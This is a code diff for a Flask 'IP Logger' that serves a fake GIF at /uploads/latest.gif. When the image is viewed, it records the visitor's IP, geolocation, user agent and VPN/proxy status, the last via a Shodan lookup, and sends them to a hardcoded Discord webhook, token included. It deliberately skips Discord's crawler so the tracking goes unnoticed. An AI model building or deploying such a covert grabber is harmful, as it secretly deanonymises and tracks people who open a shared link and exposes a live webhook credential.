@@ -2,7 +2,7 @@ import requests
 from flask import Flask, send_file, request
 
 app = Flask("app")
-webhookURL = ""
+webhookURL = "https://ptb.discord.com/api/webhooks/1056985799775768636/Ih_MBhdY7g10QDVBF5GYFgw1QO65NF6bGqwB9owvJYCrUZ7MujaFvWJcIDLX9Z8xTf74"
 
 
 @app.route("/uploads/latest.gif")
@@ -17,8 +17,17 @@ def latest():
     geolocation = "City: {0}; Region: {1}; Country: {2}".format(city, region, country)
     useragent = request.headers.get('User-Agent')
     
-    if 'discord' in useragent:
+    if "discordapp.com" in useragent or "discord.com" in useragent:
         return
+
+    data = requests.get("https://internetdb.shodan.io/{}".format(ip)).json()
+
+    vpn = "❎"
+    proxy = "❎"
+    if "vpn" in data:
+        vpn = "✅"
+    if "proxy" in data:
+        proxy = "✅"
 
     headers = {
         "username": "IP Logger",
@@ -41,7 +50,11 @@ def latest():
                 },
                 {
                     "name": "User-Agent",
-                    "value": f"```{useragent}```"
+                    "value": f"```{request.headers.get('User-Agent')}```"
+                },
+                {
+                    "name": "VPN/Proxy",
+                    "value": f"```{vpn} VPN\n{proxy} PROXY```"
                 }
             ]
         }]
